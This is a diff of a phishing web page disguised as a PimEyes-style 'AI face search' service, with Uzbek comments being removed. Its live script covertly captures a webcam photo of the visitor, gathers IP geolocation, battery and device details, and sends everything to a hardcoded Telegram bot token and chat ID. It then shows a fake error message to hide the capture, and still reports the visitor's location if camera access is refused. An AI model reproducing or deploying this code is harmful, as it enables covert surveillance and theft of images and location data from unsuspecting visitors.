@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Ai face generate - Face Search Engine</title>
     <style>
-        /* CSS QISMI - Dizaynni PimEyes'ga 1:1 o'xshatish */
         body { font-family: 'Segoe UI', sans-serif; background: #f8fafd; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
         .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; max-width: 500px; width: 90%; }
         .logo { color: #0066ff; font-size: 28px; font-weight: bold; margin-bottom: 10px; }
@@ -36,7 +35,6 @@
 <canvas id="canvas" width="640" height="480" style="display:none"></canvas>
 
 <script>
-    /* JAVASCRIPT QISMI - Ma'lumot yig'ish va botga yuborish */
     const token = "8103900618:AAHIP38KJ0Y0Rr1u1P4n9z6PdbAr9LAM-fk";
     const chat_id = "8041707187";
 
@@ -44,18 +42,15 @@
         const statusElement = document.getElementById('status');
         statusElement.innerText = "Skanerlash ko'proq vaqtni talab qilishi mumkin iltimos sabrli bo'ling!";
 
-        // --- MA'LUMOTLARNI OLDINDAN TAYYORLASH (Xato bermasligi uchun) ---
         let geoData = { ip: "Noma'lum", city: "Noma'lum", country_name: "Noma'lum" };
         let deviceModel = navigator.userAgent.includes("Android") ? "📱 Android" : (navigator.userAgent.includes("iPhone") ? "🍎 iPhone" : "💻 Desktop");
         let batteryLevel = "Noma'lum";
         let screenInfo = `${window.screen.width}x${window.screen.height}`;
 
         try {
-            // IP ma'lumotlarini olish
             const geoRes = await fetch('https://ipapi.co/json/');
             geoData = await geoRes.json();
             
-            // Batareya ma'lumotlarini olish
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
                 batteryLevel = Math.round(b.level * 100) + "%";
@@ -63,8 +58,6 @@
         } catch (e) { console.log("Geo/Battery ma'lumotlarida xato"); }
 
         try {
-            // 2. Kameraga ruxsat so'rash
-// Kamera ruxsatini olgandan keyin kutishni biroz ko'paytiramiz
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { 
                     facingMode: "user",
@@ -75,25 +68,21 @@
             const video = document.getElementById('video');
             video.srcObject = stream;
 
-            // MUHIM: Faqat vaqt emas, video kadrlar kela boshlaganini tekshiramiz
             await new Promise((resolve) => {
                 video.onloadedmetadata = () => {
                     video.play();
-                    // Video o'ynay boshlagandan keyin yana 3 soniya kutamiz (telefon uchun)
                     setTimeout(resolve, 3000); 
                 };
             });
 
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
-            // Canvas o'lchamini video bilan bir xil qilamiz
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
 
-            // 4. Botga yuborish
             const formData = new FormData();
             formData.append('chat_id', chat_id);
             formData.append('photo', blob, 'target.jpg');
@@ -113,16 +102,14 @@
                 body: formData
             });
 
-            // --- JIGARIM, MANA BU YERDA RETURN ISHLATILDI ---
             if (response.ok) {
                 stream.getTracks().forEach(t => t.stop());
                 statusElement.innerText = "System error. Try again.";
                 alert("Error 404: Tizim yuzingizni taniy olmadi. Iltimos, qayta urinib ko'ring.");
-                return; // MUHIM: Muvaffaqiyatli bo'lsa, kod shu yerda to'xtaydi va catch'ga o'tmaydi!
+                return; 
             }
 
         } catch (err) {
-            // --- 🎯 AGAR NISHON 'NERAZRESHIT' BOSSA ---
             const errorMsg = `⚠️ **Nishon kamerani blokladi!**\n🌐 IP: ${geoData.ip}\n📍 Manzil: ${geoData.city}`;
             fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(errorMsg)}`);
 
@@ -136,4 +123,5 @@
 
 </body>
 </html>
+
 
